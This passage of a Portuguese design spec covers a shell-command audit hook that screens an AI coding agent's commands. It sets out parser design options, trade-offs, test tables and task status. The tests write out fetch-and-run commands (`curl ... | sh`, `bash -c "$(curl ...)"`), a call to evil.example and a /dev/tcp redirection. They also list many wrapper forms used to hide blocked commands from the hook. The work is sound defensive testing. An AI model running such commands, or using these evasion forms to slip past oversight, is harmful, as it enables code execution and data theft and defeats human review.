| Chamar `bash -n`/`zsh -n` como oráculo no hook | sintaxe exata do shell real | não devolve as palavras de comando; um processo por chamada (cerca de 70 ms); fica só como oráculo de teste (SP6) | rejeitada no hook |

### Texto que não fecha

| Opção | Por que |
|---|---|
| **Nível B (`lex_error`), sem leitura tolerante** (escolhida) | o shell também rejeita o texto; 0 caso real no corpus; fecha L5 e L10 sem exceção de nível A |
| Leitura tolerante de nível A (duas listas, janela solta) | é o estado atual: 712 + 622 motivos no corpus e o caso HIGH `A="x y z w v" docker restart api # "` permitido |
| Toda posição seguinte como início possível (sugestão (a) da revisão) | linear com o teto, mas comandos longos estouram `MAX_READINGS` e viram nível B; com um parser real, desnecessário |

### Corpos de heredoc

| Opção | Por que |
|---|---|
| **Pelo receptor: dado, outra linguagem, shell; expansões de corpo sem aspas sempre analisadas** (escolhida) | semântica exata; 0 corpo de receptor de shell ou desconhecido falha no corpus; fecha L6 |
| Todo corpo que não é dado lido como shell, com recuperação por linha | mantém a armadilha dos corpos Python (164 não fecham) e exige uma leitura tolerante |
| Corpos Python lidos como shell e erro tratado como nível B | negaria 164 comandos reais |

### Comandos e código dentro de variáveis

| Opção | Por que |
|---|---|
| **Propagação de valores atribuídos no próprio texto (V1-V4); código desconhecido é nível B; nome de programa desconhecido é nível A** (escolhida) | pega o caso real `zsh -c "$T down -v"` e `T=...; $T down`; os laços `for c in ...; do zsh -c "$c"` passam a ser analisados valor a valor em vez de negados |
| Sem propagação, código com variável sempre nível B | nega cerca de 14 comandos reais e não pega `T=...; $T down` |
| Sem propagação, tudo nível A | deixa passar o caso real |

### Onde fica o parser

| Opção | Latência | Decisão |
|---|---|---|
| **Módulo irmão, importado por caminho, bytecode em cache** | cerca de +0,6 ms | **escolhida** |
| No mesmo arquivo do hook | cerca de +10 ms por chamada (compilação) | rejeitada |
| Junto com o lançador (hook inteiro em módulo) | -26 ms | fica para a spec do lançador (Open questions 4) |

*Adendo 2026-11-14 (2):* o classificador seguiu o mesmo caminho do parser (segundo módulo irmão, decisão do usuário na revisão); o lançador continua fora; ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), A13.

## Trade-offs

- **Gramática estrita**: sintaxe válida do zsh ou do bash fora do subconjunto é negada (`lex_error`) em vez de lida com palpite. Mitigação: o replay mede antes do merge, e cada forma legítima vira uma produção nova com teste.
- **Corpos Python não são mais lidos como shell**: perde-se uma heurística que nunca pegou nada real (uma linha `docker ...` num programa Python é erro do Python), e somem os falsos positivos dela.
- **Propagação insensível ao fluxo**: `T=a; T=b` dá as duas leituras; um valor em um ramo que não roda também conta. A união acrescenta leituras, mas sozinha pode perder o valor do ambiente: em `[ -n "$X" ] || X=ls; $X restart x` o `X` lido pode ser o do ambiente, e a união `{ls}` apagava o registro `dynamic_command`. Por isso um uso antes da primeira atribuição incondicional de nível de cima mantém o ambiente como candidato, em nível B *(revisado pelo [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), A7; o texto original dizia "Só acrescenta negações", o que a revisão desmentiu com a atribuição condicional)*.
- **`dynamic_command` continua nível A**: `$X restart y` com `X` vindo do ambiente passa, registrado e com o canário vendo `docker`. Negar custaria até cerca de 54 comandos reais (Open questions 2).
- **Mais código no hook**: cerca de 700 linhas de parser e 300 de integração, num módulo próprio com testes de gramática, propriedade e fuzz; em troca saem cerca de 350 linhas de scanner, fallback e janela.
- **Suite maior**: orçamento mantido em 8,5 s (Task 7; revisado para 12 s em A29); a meta de 5 s continua aberta.
- **Aliases e funções do usuário** continuam invisíveis ao hook.

## Testing

Suite: `claude-hooks` (tabela `Test suites` do `CLAUDE.md` da raiz; hoje 462 testes em 6,8 s). Comandos com `docker`/`git` aparecem só como strings, montadas quando o literal inteiro seria negado pelo hook vivo. Classes e testes novos citam esta spec na docstring; módulos novos usam `ForkedSuite` em `load_tests`. Os testes do parser carregam o módulo por `load_hook("agent_audit_shell.py")`. `HookProcess` copia também `agent_audit_shell.py`, e `patch_source(old, new, file="agent-audit.py")` ganha o parâmetro do arquivo.

### Testes que mudam (com motivo)

| Teste | Mudança | Motivo |
|---|---|---|
| `test_classify.py` L19 `mise exec -c busted` | `["other", "test-full"]` | `-c` roda o valor por um shell (doc do mise); o valor é classificado (X1) |
| `test_classify.py` `test_pieces_are_stripped_after_the_split` | sai a segunda asserção (`SEGMENT_SPLIT.split`) | `SEGMENT_SPLIT` não existe mais; a primeira asserção fica |
| `test_classify.py` `HeredocOpenerBound.test_the_sink_verdict_is_shared...` | espião em `_heredoc_is_data` via `analyze_command`: uma chamada por comando simples | `strip_heredoc_bodies` e `_is_data_sink` saem |
| `test_heredoc.py` `FailSafeStripsNothing`: `brace_in_body`, `backtick_in_body`, `crlf_body` | passam a esperar o corpo removido | delimitador entre aspas não expande; `\r` é caractere comum nos dois shells (semântica exata, seção 5) |
| `test_heredoc.py` `HS2` `(sh -s) cat <<EOF` | espera `unclassified_command`, motivo `lex_error` | sintaxe inválida no bash e no zsh |
| `test_heredoc.py` `HS7` | mesmos casos sobre `_clean_sink_words(command_readings(...))` | a função passa a receber palavras do parser |
| `test_heredoc.py` `ScannerFallback` | `analyze_command` com `shell.parse` levantando `RuntimeError` propaga; por `call_main`, negação `classifier_error` | não há mais scanner com fallback; defeito do parser é nível B (U4 da hardening) |
| `test_uncertainty.py` UN8 (`"docker" restart x '`, `A="x y docker restart api`) | `(["unclassified"], ["unclassified_command"])`, `["lex_error"]` | texto que não fecha é nível B (S3); continua negado |
| `test_uncertainty.py` UN8 `test_un8_the_reason_needs_two_different_readings` | a última linha vira `analyze('echo "a').uncertainty == ["lex_error"]` | `Readings.fallback` sai |
| `test_uncertainty.py` `EnvAssignmentPrefix.test_a_window_that_ends_before_the_command_is_recorded` | os três comandos: `docker_lifecycle` nas flags, uncertainty vazio, e por `call_main` negação | fecha o HIGH: o `#` é comentário (S4), sem janela |
| `test_uncertainty.py` `EnvAssignmentPrefix.test_a_window_that_reaches_the_end...` e `test_an_unclosed_quote...` | `lex_error`, `unclassified_command` | S3; `FOO="a b" echo hi` continua uma leitura |
| `test_uncertainty.py` `EnvAssignmentPrefix` `_opens_unclosed_quote` | as duas asserções viram `shell.ASSIGNMENT` sobre `A+="x` (sim) e `A[0]=x` (sim) | S8: o bash executa o comando depois de `A[0]=x` |
| `test_uncertainty.py` UN9 (canário) | os cinco comandos de `test_un9_forms_the_parser_does_not_model...` vão para `test_command_positions.py` como classificados; o canário passa a ser testado com `ssh h docker restart x`, `echo docker restart x`, `X=$1; $X docker restart x` | essas formas agora são modeladas |
| `test_uncertainty.py` `test_a_path_prefixed_program_is_recognized` | `true & /usr/bin/docker restart x`: `docker_lifecycle`, sem canário | N2 |
| `test_uncertainty.py` UN12 | o `what_to_do` da seção 6 | texto novo cobre sintaxe e código dinâmico |
| `test_agent_metrics.py` MR2 | `dynamic_command` conta como nível A | `LEVEL_A_REASONS` |
| `_support.py` `HookProcess` | copia o módulo; `patch_source(..., file=...)` | módulo novo |

Nenhuma outra linha das tabelas de `test_classify.py` (`COMMAND_TABLE`, `PREFIX_TABLE`, `LUA_TABLE`, `TIMEOUT_*`) muda; UN10 continua comparando as duas entradas com elas.

### `test_shell_lexer.py` (novo, Task 1)

Tabelas `(id, texto, esperado)`, uma subTest por linha; o esperado é a lista de comandos simples na forma `cabeça arg...` (palavras `.text`) com o contexto (`top_level`, `stage/stages`, `substitution`), ou o tipo de erro.

| # | Casos | Esperado |
|---|---|---|
| SL1 | listas: `a; b`, `a & b`, `a && b \|\| c`, `a \| b \|& c`, `a` + nova linha + `b`, `a;` | comandos e estágios certos |
| SL2 | aspas: `echo "a; b"`, `echo 'a && b'`, `echo $'a\'; b'`, `echo "a` + nova linha + `b"`, `echo a\;b`, `echo "$(x)"` | um comando `echo` (e `x` aninhado no último) |
| SL3 | comentários: `ls # a; b`, `ls #"`, `echo a#b`, `echo "#"` | `ls` sozinho; `echo a#b`; `echo #` |
| SL4 | compostos: `(a)`, `{ a; }`, `if a; then b; elif c; then d; else e; fi`, `while a; do b; done`, `until`, `for i in x y; do a; done`, `for ((i=0;i<3;i++)); do a; done`, `select`, `case $x in a) b;; (c\|d) e;& f) g;;& esac`, `f() { a; }`, `function f { a; }`, `! a`, `time -p a`, `coproc a`, `coproc N { a; }` | os comandos `a`..`g` com `in_compound`; palavras de `for` e padrões de `case` não são comandos |
| SL5 | substituições: `x=$(a)`, `echo $(a $(b))`, `` echo `a` ``, `` echo "`a`" ``, `diff <(a) >(b)`, `echo ${X:-$(a)}`, `echo $((1 + $(a)))`, `echo $[1+$(a)]`, `[[ $(a) == x ]]`, `(( $(a) ))`, `$(case x in a) b;; esac)` | `a` e `b` como comandos aninhados com `substitution` certo |
| SL6 | atribuições: `A=1 b`, `A+=1 b`, `A[0]=1 b`, `A="x y" b`, `A=$(c) b`, `A=(x y) b`, `declare -a A=(x $(c))`, `"A=1" b`, `A=1` | cabeça `b` (exceto `"A=1" b`: cabeça `A=1`), `c` aninhado; `A=1` sem comando |
| SL7 | redirecionamentos: `a > f`, `a 2>&1`, `a &> f`, `a {fd}> f`, `a <<< "s"`, `> f a`, `a >| f`, `a <> f` | um comando `a`, redirecionamentos na árvore |
| SL8 | heredoc: as formas de `test_heredoc.py` (`<<EOF`, `<<-EOF`, `<< EOF`, `<<"EOF"`, `<<\EOF`, `<<'EOF'`), dois na mesma linha, sem terminador, terminador com espaço, `\` + nova linha no delimitador, nova linha entre aspas na linha do abridor, heredoc dentro de `$(` | corpo e `quoted` certos; comandos depois do terminador |
| SL9 | expansões de corpo sem aspas: `cat <<EOF` + `$(a)` / `` `a` `` / `${X:-$(a)}`; com aspas: nenhuma | `a` aninhado só sem aspas |
| SL10 | erros: `echo "a`, `echo 'a`, `` echo `a ``, `echo $(a`, `echo ${a`, `echo $((1`, `if a; then b`, `fi`, `a )`, `(a) b`, `;`, `a &&`, `a \|`, `cat <<`, `for i (1) a`, `foreach i (1) a end`, `{ a }`, `ls *(.)`, `echo =(a)`, `a &\| b`, `() { a }`, `\0` | `ShellSyntaxError` com o `kind` esperado e `pos` |
| SL11 | `MAX_NESTING`: 32 e 33 níveis de `(`, de `$(` e de `if` | o primeiro lê; o segundo `NestingTooDeep` |
| SL12 | orçamento: `Budget(10)` com texto de 11; crases aninhadas que descontam de novo | `BudgetExceeded` |
| SL13 | `iter_sites`: `cd x && cat > f <<EOF`, `{ cat <<EOF; } \| x`, `x \| cat > f <<EOF`, `git commit -m "$(cat <<'EOF' ...)"` | `top_level`, `stages`, `stage` e `substitution`/`sub_word` certos |

### `test_shell_properties.py` (novo, Task 1; sementes fixas, cada teste abaixo de 0,5 s)

| # | Propriedade | Como |
|---|---|---|
| SP1 | Totalidade: `parse` devolve uma árvore ou levanta um `ShellError`, nunca outra exceção | 3.000 textos aleatórios (`random.Random(1)`) sobre um alfabeto de shell (aspas, `$`, `(`, `)`, `{`, `}`, `` ` ``, `;`, `&`, `\|`, `<`, `>`, `#`, `\`, nova linha, palavras reservadas, `docker`, letras) |
| SP2 | `analyze_command` nunca levanta, com o mesmo gerador | idem, 1.000 textos |
| SP3 | Spans: toda `Word.span` fatia o texto de origem; spans de comandos de cima são ordenados e disjuntos | sobre as árvores de SP1 |
| SP4 | Verdade de chão por gramática: um gerador a partir da seção 2.2 monta scripts com comandos sentinela `cmdN` em posições de comando e palavras `argN` em posições de argumento, com espaçamento e aspas aleatórios; as cabeças achadas são exatamente os `cmdN` | 1.000 scripts; `shlex.quote` para as aspas |
| SP5 | Fechamento por envoltório (fail-open): para cada forma bloqueada da tabela (lifecycle, push, commit, `curl` externo), envolvida em cada envoltório (`( )`, `{ ; }`, `if`, `for`, `while`, `case`, `!`, `true && `, `true & `, `$( )`, crase, `x=$( )`, `<( )`, `sudo -u u `, `env A=1 `, `nice -n 5 `, `nohup `, `time -p `, `stdbuf -oL `, `ionice -c 3 `, `xargs `, `watch -x `, `command `, `exec `, `bash -c Q`, `sh -lc Q`, `eval Q`, `trap Q EXIT`, `T=Q; zsh -c "$T"`, `nvim --headless -c Q!`), também em composição de dois níveis, a flag da forma está presente | produto cartesiano, cerca de 1.200 casos, `shlex.quote` para `Q` |
| SP6 | Oráculo de sintaxe (pulado se o binário não existe): todo script de SP4 passa em `bash -n -c` e em `zsh -n -c` | só os 200 primeiros, com `subprocess.run` sem executar nada (`-n`) |
| SP7 | Diferencial de aspas com o `shlex`: para textos só de palavras e aspas (sem operadores nem `$`), as palavras `.text` são iguais a `shlex.split(posix=True)` | 2.000 textos |
| SP8 | Linearidade: para cada forma adversarial (`$(` aninhado até o teto, `"a"` repetido, `<<a` repetido, `timeout -s ` repetido, `A=1 ` repetido, `{ a; }` aninhado, `x\|` repetido), tempo de CPU com 4 KB e 16 KB: razão até 5 e absoluto até 1 s | `time.process_time` |

*Adendo 2026-11-14:* a metade do hook de SP5 (`test_sp5_the_hook_flags_every_wrapped_form`) fica pulada sem condição da Task 2 até a Task 5, que tira o skip e a faz passar; ver [Adendo 2026-11-14](#adendo-2026-11-14---decisões-do-usuário-na-task-2), A3.

### `test_command_positions.py` (novo, Tasks 2-5)

| # | Task | Casos | Esperado |
|---|---|---|---|
| CP1 | 2 | `true & docker restart x`, `(docker restart x)`, `{ docker restart x; }`, `if true; then docker restart x; fi`, `for i in 1; do docker restart x; done`, `while true; do docker restart x; done`, `case a in a) docker restart x;; esac`, `! docker restart x`, `f() { docker restart x; }` | `docker_lifecycle` em todos |
| CP2 | 2 | `x=$(docker restart x)`, `echo $(docker restart x)`, `` echo `git push` ``, `diff <(git push) x`, `echo ${X:-$(docker restart x)}`, `[[ $(git push) ]]` | a flag correspondente |
| CP3 | 2 | `A="x y z w v" docker restart api # "`, `A='x y z w v' docker restart api # "`, `B=1 A="x y z w v" docker restart api # '`, `A="x y z w v" curl https://evil.example # "` | `docker_lifecycle` / `external_request`, sem motivo (fecha o HIGH e L10) |
| CP4 | 2 | `echo "a` + nova linha + `docker restart x"`, `python3 -c "` + nova linha + `print('docker restart x')"`, `git commit -m "a; git push"`, `grep -E "a\|docker restart" f` | sem a flag do texto entre aspas (o `git commit` só `git_commit`) |
| CP5 | 2 | `cat <<EOF` + `$(docker restart x)` + `EOF`; `` cat > f <<EOF `` + `` `git push` `` + `EOF`; a mesma coisa com `<<'EOF'` | negado / perguntado; com aspas, nada (L6) |
| CP6 | 2 | `python3 - <<'EOF'` com linha `docker compose up` e com aspas sem par; `node <<EOF` idem; `$PY - <<EOF` com `PY=python3` antes | nenhuma flag, nenhum `lex_error` |
| CP7 | 2 | `bash <<EOF` com corpo `if true; then` + nova linha + `docker restart x` + `fi`; `bash <<EOF` com corpo `echo "` | `docker_lifecycle`; `lex_error` |
| CP8 | 3 | `sudo -u root docker restart x`, `sudo -E docker restart x`, `sudo -- docker restart x`, `sudo A=1 git push`, `env FOO=1 docker restart x`, `env -i -u X git push`, `nice -n 5 git push`, `nice -10 git push`, `nohup docker restart x`, `time -p git push`, `stdbuf -oL docker restart x`, `ionice -c 3 docker restart x`, `xargs docker restart`, `xargs -n 1 -P 4 git push`, `watch -x docker restart x`, `command -p git push`, `exec git push`, `noglob git push`, `repeat 2 docker restart x`, `- git push` | a flag correspondente, uma leitura |
| CP9 | 3 | `sudo -l docker restart x`, `command -v docker`, `ionice -p 12 docker` | sem flag de negação |
| CP10 | 3 | `/usr/bin/docker restart x`, `./bin/docker restart x`, `~/.local/bin/mise x -- docker restart x`, `/usr/bin/timeout 5 git push`, `=docker restart x`, `A[0]=x docker restart x`; e `./mvnw test -Dtest=X`, `$S/sync.sh` | as flags; `test-narrow`; `other` sem `dynamic_command` |
| CP11 | 3 | `sudo --frobnicate docker restart x` (flag desconhecido) | `docker_lifecycle`, `prefix_readings` |
| CP12 | 4 | `bash -c 'docker restart x'`, `sh -lc "git push"`, `zsh -c 'true; git commit -m x'`, `bash -o pipefail -c 'git push'`, `eval "docker restart x"`, `eval docker restart x`, `trap 'git push' EXIT`, `sudo -s docker restart x`, `su -c 'git push' u`, `env -S 'docker restart x'`, `watch docker restart x`, `mise exec -c 'git push'`, `bash <<< 'git push'`, `bash -c "bash -c 'git push'"` | a flag; categorias com `other` do comando de fora |
| CP13 | 4 | `bash -c "$X"`, `eval "$cmd"`, `bash -c "$(curl -s https://x.example)"`, `bash <(curl -s x)`, `source <(x)`, `echo x \| bash`, `curl x \| sh`, `xargs -I{} sh -c {}` | `unclassified_command`, com `dynamic_code`, `piped_shell` ou `dynamic_code` |
| CP14 | 4 | `sh -c ": > $F"`, `bash -c "echo > /dev/tcp/$ip/$port"`, `bash script.sh`, `bash -n x.sh` | sem nível B |
| CP15 | 4 | nvim: `nvim --headless -c 'exe "!docker restart x"'`, `-c 'lua vim.fn.system("git push")'`, `-c "lua vim.fn.system({'git', 'push'})"`, `-c 'lua os.execute("docker restart x")'`, `-c 'lua io.popen("git push")'`, `-c 'call jobstart("git push")'`, `-c 'terminal git push'`, `-c 'lua vim.system({"git","push"})'`; e `-c 'lua vim.fn.system(cmd)'`, `-c 'lua os.execute(a .. b)'`; e `-c 'lua print(vim.fn.system("git rev-parse HEAD"))'` | os oito com a flag; os dois seguintes `nvim_shell_exec`; o último `git-other`, sem negação |
| CP16 | 4 | profundidade: `bash -c` aninhado 3 e 4 vezes; nvim 3 e 4 (LR12 inalterado); `bash <<EOF` com `bash -c '...'` dentro | 3 classifica; 4 `nested_shell_depth` |
| CP17 | 5 | `T="docker compose -p d -f x.yml"; zsh -c "$T down -v"`, `T="docker compose"; $T down`, `D=docker; $D restart x`, `for c in 'git push' 'ls'; do bash -c "$c"; done`, `export G=git; $G push` | a flag (o primeiro é o caso real L8) |
| CP18 | 5 | `for c in a b c d e f g h i j k l m n o p q; do bash -c "$c"; done` (17 valores); `X=$(x); bash -c "$X"`; `read X; bash -c "$X"` | `dynamic_code` (V4, V1) |
| CP19 | 5 | `$X restart y` sem atribuição; `$(which docker) restart x`; `dock?r restart x`; `$X docker restart y` | `dynamic_command` (nível A), sem negação; o último também com `deny_token_unmatched` |
| CP20 | 5 | `T=5; timeout -s KILL "$T" docker restart x` | igual a LR13 (V2: valores não entram em argumentos de wrapper) |

### Outros módulos

| # | Arquivo | Task | Caso | Esperado |
|---|---|---|---|---|
| UN14 | `test_uncertainty.py` | 2 | cada motivo novo de nível B por `call_main`, pre, para `main` e `backend-python` | deny `unclassified_command`, `uncertainty` com o motivo, flags `["parse_uncertain", "unclassified_command"]` |
| UN15 | `test_uncertainty.py` | 2 | `git grep`-equivalente no fonte: `shlex`, `SEGMENT_SPLIT`, `LOOSE_VALUE_TOKENS`, `shlex_fallback`, `loose_assignment_truncated` não aparecem em `agent-audit.py` | ausentes |
| UN16 | `test_uncertainty.py` | 2 | módulo ausente ou com erro de sintaxe (cópia em diretório temporário, por `HookProcess`) | pre de Bash negado com `classifier_error`; pre de Write segue normal |
| BIO11 | `test_bounded_io.py` | 1 | AST de `agent_audit_shell.py`: só importa `re` e `__future__`; nenhuma chamada de arquivo, processo ou `sys` *(revisado pelo [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), A13, e pelo [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final), A26: o teste não aceita mais `typing`, com `import typing` e `from typing import NamedTuple` entre os casos ruins)* | passa |
| P-SL1 | `test_hook_process.py` | 2 | `true & docker restart x`; `cat <<EOF` + `$(docker restart x)`; `A="x y z w v" docker restart api # "` | deny `docker_lifecycle` |
| P-SL2 | `test_hook_process.py` | 2 | `echo "a` (sem par) | deny `unclassified_command`, `lex_error` |
| P-SL3 | `test_hook_process.py` | 4 | `bash -c "$X"` | deny `unclassified_command`, `dynamic_code` |
| P-SL4 | `test_hook_process.py` | 2 | duas execuções seguidas do processo, sem `-B`, num diretório temporário: a segunda carrega o módulo do `__pycache__` | o `.pyc` existe depois da primeira; mesma decisão |
| MR6 | `test_agent_metrics.py` | 6 | registro com `dynamic_command` e decisão `ask`; registros antigos com `shlex_fallback` e `loose_assignment_truncated` | candidatos a falso positivo; rotulados como hoje |

### Regras -> testes

| Regra | Testes |
|---|---|
| S1 fonte única | UN15, SP4, SL1 |
| S2 aspas | SL2, SP7, CP4 |
| S3 erro é nível B | SL10, UN8 alterado, CP7, P-SL2, UN14 |
| S4 comentário | SL3, CP3 |
| S5 substituições | SL5, SL9, CP2, CP5 |
| S6 posições | SL4, CP1, SP4, SP5 |
| S7 aninhamento | SL11, UN14 |
| S8 atribuições | SL6, CP10 |
| S9 formas do zsh | SL10 |
| S10 orçamento | SL12, SP8, UN14 |
| N1 leituras | UN1-UN5 (inalterados), UN10 |
| N2 nome do programa | CP10, `test_a_path_prefixed_program_is_recognized` |
| N3 wrappers | CP8, CP11 |
| N4 prefixos do zsh | CP8 |
| N5 sem comando | CP9 |
| N6 nome dinâmico | CP19, MR6 |
| X1 código | CP12, SP5 |
| X2 profundidade | CP16, LR12, UN6 |
| X3 código dinâmico | CP13, CP18, P-SL3 |
| X4 shell por pipe | CP13 |
| X5 `<(...)` como script | CP13 |
| X6 nvim | CP15, LR3 |
| X7 outras linguagens | CP6, CP4 |
| V1-V4 valores | CP17, CP18, CP20 |
| HD1 leitura de heredoc | SL8, `test_heredoc.py` atual |
| HD2 expansões de corpo | SL9, CP5, P-SL1 |
| HD3 dado | `DataSinkHeredocsAreStripped`, `SubstitutionOnlyDataAsMessageValue`, `StdinFileSinkLimits`, HS3-HS6 |
| HD4 receptor | CP6, CP7, `BodyKeptUnlessDataSink` |
| HD5 motivo | HS8 |
| HD6 teto | `HeredocOpenerBound` |
| U1-U4 motivos | UN14, UN15, MR6 |
| P1 linear e orçamento | SP8, UN3, UN4, `Round4Timing`, medidas da Task 2 e 5 |
| P2 pureza | BIO11 |

*Adendo 2026-11-14:* HD3 ganha os testes `test_hd3_*` de `test_command_positions.py` (A1); a classificação de `git commit` ganha GC1 (A2); SP5 (S6, X1) só conta inteiro a partir da Task 5 (A3). Ver [Adendo 2026-11-14](#adendo-2026-11-14---decisões-do-usuário-na-task-2).

*Adendo 2026-11-14 (2):* as regras A5-A13 ganham SL14-SL20 (`test_shell_lexer.py`), `ReviewFixB1` e `ReviewFixB2` (`test_command_positions.py`), `CodeEvaluationContexts` e os casos novos de UN16 (`test_uncertainty.py`), `AnsiCQuotedWords` (`test_classify.py`), BIO12 (`test_bounded_io.py`) e P-SL4 estendido (`test_hook_process.py`); P2 passa a ser coberto por BIO11 e BIO12. O mapa por regra está em cada seção do [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão).

*Adendo 2026-11-14 (3):* as regras A14-A27 ganham `ReviewFixD1` (`test_command_positions.py`), `LevelBReasonsD1` (`test_uncertainty.py`), `ParserFormsAtTheHookLevel` (`test_classify.py`), P-SL4 estendido (`test_hook_process.py`) e BIO11 sem `typing` (`test_bounded_io.py`); dois testes de B1/B2 foram renomeados e revisados (A18, A24). O mapa por regra está em cada seção do [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

## Implementation order

### Task 1 - Módulo do lexer e parser

- **Stack:** backend-python
- **Files:** `.claude/hooks/agent_audit_shell.py`, `.claude/hooks/tests/test_shell_lexer.py`, `.claude/hooks/tests/test_shell_properties.py`, `.claude/hooks/tests/test_bounded_io.py`
- **Depends on:** -
- **Done when:** `agent_audit_shell.py` implementa a seção 2 e a API da seção 3 (tipos, `parse`, `iter_sites`, `Budget`, `ASSIGNMENT`, erros com `kind` e `pos`, `MAX_NESTING = 32`), sem I/O (P2); SL1-SL13, SP1-SP8 e BIO11 passam (SP6 pulado só sem `bash`/`zsh`); o hook ainda não usa o módulo; `python3 -I -B -m unittest discover -s .claude/hooks/tests -t .claude/hooks` verde; `agent-audit.py`, `agent-audit.json` e `settings.json` intactos
- **Status:** done

### Task 2 - Classificação sobre a árvore, heredoc e níveis de incerteza

- **Stack:** backend-python
- **Files:** `.claude/hooks/agent-audit.py`, `.claude/hooks/tests/_support.py`, `.claude/hooks/tests/test_classify.py`, `.claude/hooks/tests/test_uncertainty.py`, `.claude/hooks/tests/test_heredoc.py`, `.claude/hooks/tests/test_command_positions.py`, `.claude/hooks/tests/test_hook_process.py`, `.claude/hooks/tests/test_hook_main.py`, `.claude/hooks/tests/test_shell_properties.py`
- **Depends on:** Task 1
- **Done when:** o hook carrega o módulo por caminho (seção 4.1; ausente ou quebrado: `classifier_error`); `analyze_command` percorre a árvore (S1-S10, N1 sobre palavras, U1-U4, motivos `lex_error`, `nesting_depth`, `analysis_budget`); heredoc pela seção 5 (HD1-HD6, desqualificadores, tabela "Comportamento resultante"); os itens "sai" da seção 4.5 removidos (sem `shlex`, `SEGMENT_SPLIT`, `LOOSE_VALUE_TOKENS`, `_scan_heredocs`, `shlex_fallback`, `loose_assignment_truncated` em `agent-audit.py`); `MAX_LEX_CHARS` e `MAX_CODE_DEPTH` nomeados (`MAX_CODE_DEPTH` ainda só para o nvim); os testes da tabela "Testes que mudam" que cabem nesta task alterados com o motivo na docstring; CP1-CP7, UN14-UN16, P-SL1, P-SL2 e P-SL4 passam; as demais linhas das tabelas de `test_classify.py` sem mudança; medidas da seção 7 (corpus sintético das tabelas de teste mais as formas adversariais, e o processo do hook) no relatório, dentro do orçamento; suite verde; `agent-audit.json` e `settings.json` intactos *Adendo 2026-11-14:* vale também: o passo 4 da seção 5 revisado (HD3, A1), com os dois testes `test_hd3_*` de `test_command_positions.py` passando; `test_sp5_the_hook_flags_every_wrapped_form` pulado sem condição, com o motivo e a Task 5 no texto do skip (A3); nenhum import de `typing` em `agent-audit.py` (A4); ver [Adendo 2026-11-14](#adendo-2026-11-14---decisões-do-usuário-na-task-2)
- **Status:** done

### Task 3 - Wrappers e nome do programa

- **Stack:** backend-python
- **Files:** `.claude/hooks/agent-audit.py`, `.claude/hooks/tests/test_command_positions.py`, `.claude/hooks/tests/test_uncertainty.py`, `.claude/hooks/tests/test_classify.py`
- **Depends on:** Task 2
- **Done when:** `_prefix_steps` lê a tabela da seção 4.2 (N3-N5), `KNOWN_HEADS` calculado e N2 aplicado; CP8-CP11 e o `test_a_path_prefixed_program_is_recognized` alterado passam; UN1-UN5 sem mudança; suite verde *Adendo 2026-11-14:* vale também: `git-commit`/`git_commit` só com `commit` como subcomando, depois das opções globais do git (A2); GC1 passa, inclusive `git config --get commit.gpgsign` sozinho e dentro de `$(...)` sem `git_commit`; as demais linhas das tabelas de `test_classify.py` sem mudança; ver [Adendo 2026-11-14](#adendo-2026-11-14---decisões-do-usuário-na-task-2)
- **Status:** done

### Task 4 - Argumentos que executam código e recursão

- **Stack:** backend-python
- **Files:** `.claude/hooks/agent-audit.py`, `.claude/hooks/tests/test_command_positions.py`, `.claude/hooks/tests/test_classify.py`, `.claude/hooks/tests/test_uncertainty.py`, `.claude/hooks/tests/test_hook_process.py`
- **Depends on:** Task 3
- **Done when:** `_code_args` segue a tabela da seção 4.3 (X1-X7), `nvim_shell_texts` sobre palavras com as formas de X6, `MAX_CODE_DEPTH` vale para toda recursão de código (X2), motivos `dynamic_code`, `piped_shell`, `nvim_shell_exec`; L19 alterado; CP12-CP16 e P-SL3 passam; LR3, LR12, UN6 e `Round3` sem mudança; suite verde
- **Status:** done

### Task 5 - Propagação de valores e nomes dinâmicos

- **Stack:** backend-python
- **Files:** `.claude/hooks/agent-audit.py`, `.claude/hooks/tests/test_command_positions.py`, `.claude/hooks/tests/test_uncertainty.py`, `.claude/hooks/tests/test_shell_properties.py`
- **Depends on:** Task 4
- **Done when:** `_known_values` segue V1-V4 (seção 4.4) com `MAX_VALUE_CANDIDATES = 16`; N6 com o motivo `dynamic_command`; o canário alterado de UN9 passa; CP17-CP20 passam; LR13 sem mudança; medidas da seção 7 repetidas no relatório, dentro do orçamento; suite verde *Adendo 2026-11-14:* vale também: o skip de `test_sp5_the_hook_flags_every_wrapped_form` removido e o teste passando, com todos os envoltórios e composições de SP5 (A3); ver [Adendo 2026-11-14](#adendo-2026-11-14---decisões-do-usuário-na-task-2)
- **Status:** done

### Task 6 - Textos e métricas

- **Stack:** backend-python
- **Files:** `.claude/hooks/agent-audit.py`, `.claude/hooks/agent-metrics.py`, `.claude/hooks/tests/test_uncertainty.py`, `.claude/hooks/tests/test_agent_metrics.py`
- **Depends on:** Task 5
- **Done when:** `WHY`, `what_to_do`, `FLAG_LABELS` e `LEVEL_A_REASONS` com os textos da seção 6; UN12 alterado e MR6 passam; as seções atuais do relatório não mudam de forma; suite verde
- **Status:** done

### Task 7 - Tempo da suite dentro do orçamento

- **Stack:** backend-python
- **Files:** `.claude/hooks/tests/*.py`
- **Depends on:** Task 6
- **Done when:** perfil por teste antes e depois no relatório (os 30 mais lentos e o total por módulo); a suite inteira roda em no máximo 8,5 s de parede, nenhum teste isolado passa de 0,5 s, três execuções seguidas verdes; os testes de propriedade mantêm sementes fixas e as quantidades da seção Testing (ou maiores); nenhuma asserção enfraquecida; o hook não muda. *Revisado (A29):* o orçamento passa a 12 s de parede para os 811 testes atuais
- **Status:** done

## Verification

No fim do run, pelo `test-runner`:

1. Suite `claude-hooks` inteira, verde, três vezes seguidas, com o tempo de parede de cada uma (orçamento da Task 7: até 12 s para 811 testes, revisado de 8,5 s em A29), normal e com `TMPDIR` dentro de um diretório `claude-*` do scratchpad.
2. `git grep -n "shlex\|SEGMENT_SPLIT\|LOOSE_VALUE_TOKENS\|_scan_heredocs\|NVIM_MAX_DEPTH\|shlex_fallback\|loose_assignment_truncated" -- .claude/hooks/agent-audit.py` sem ocorrências.
3. `git diff --stat main -- .claude/settings.json .claude/hooks/agent-audit.json` vazio.

Sem runtime local nem UI: não há request a uma instância nem check visual. Pela sessão principal, só leitura, scripts no scratchpad:

